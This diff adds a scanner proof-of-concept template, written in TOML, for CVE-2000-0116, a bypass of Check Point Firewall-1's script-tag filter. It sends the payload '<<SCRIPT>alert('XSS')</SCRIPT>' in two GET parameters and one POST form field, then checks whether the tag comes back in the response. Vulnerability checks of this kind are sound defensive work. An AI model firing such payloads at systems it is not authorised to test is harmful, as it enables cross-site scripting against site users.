@@ -1,0 +1,75 @@
+[info]
+author = "ave"
+description = "验证 Check Point Firewall-1 3.0 是否存在脚本标签过滤绕过漏洞，通过在 SCRIPT 标签前添加额外的 '<' 字符绕过 'Strip Script Tags' 过滤功能"
+id = "POC-AVE-2000-0101"
+name = "CVE-2000-0116 PoC - Check Point Firewall-1 Script Tag Filter Bypass"
+severity = "high"
+tags = [
+    "cve-2000-0116",
+    "ave-2000-0101",
+]
+vuln_id = [
+    "CVE-2000-0116",
+    "AVE-2000-0101",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/?test=<<SCRIPT>alert('XSS')</SCRIPT>"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<<SCRIPT>",
+    "<SCRIPT>",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/search"
+protocol = "http"
+
+[poc.requests.body]
+type = "form"
+
+[poc.requests.body.content]
+query = "<<SCRIPT>alert('XSS')</SCRIPT>"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<<SCRIPT>",
+    "<SCRIPT>",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/?input=<<SCRIPT>alert('XSS')</SCRIPT>"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "<<SCRIPT>",
+    "<SCRIPT>",
+]
